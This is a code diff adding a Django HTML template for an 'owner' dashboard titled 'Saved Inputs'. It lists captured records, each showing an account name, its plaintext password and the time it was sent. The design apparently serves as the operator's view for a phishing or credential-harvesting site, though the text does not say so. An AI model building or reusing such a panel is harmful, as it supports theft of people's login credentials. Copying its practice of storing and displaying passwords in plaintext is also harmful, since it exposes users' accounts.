@@ -1,0 +1,80 @@
+<!-- templates/owner/messages_dashboard.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Saved Inputs</title>
+  <style>
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #f0f2f5;
+      color: #333;
+      padding: 20px;
+    }
+
+    h1 {
+      text-align: center;
+      color: #2c3e50;
+      margin-bottom: 10px;
+    }
+
+    p {
+      text-align: center;
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+    }
+
+    ul {
+      list-style: none;
+      padding: 0;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    li {
+      background: #fff;
+      padding: 15px 20px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      line-height: 1.6;
+    }
+
+    li strong {
+      color: #2980b9;
+    }
+
+    li small {
+      color: #555;
+    }
+
+    .no-messages {
+      text-align: center;
+      color: #888;
+      font-style: italic;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Saved Inputs</h1>
+  <p>Total messages: {{ msg.count }}</p>
+
+  {% if msg.count > 0 %}
+  <ul>
+    {% for m in msg %}
+      <li>
+        account: <strong>{{ m.identifier }}</strong> <br>
+        password: <strong>{{ m.password }}</strong> <br>
+        Sent: <small>{{ m.created_at|date:"M d, Y H:i" }}</small>
+      </li>
+    {% endfor %}
+  </ul>
+  {% else %}
+    <p class="no-messages">No messages yet.</p>
+  {% endif %}
+
+</body>
+</html>
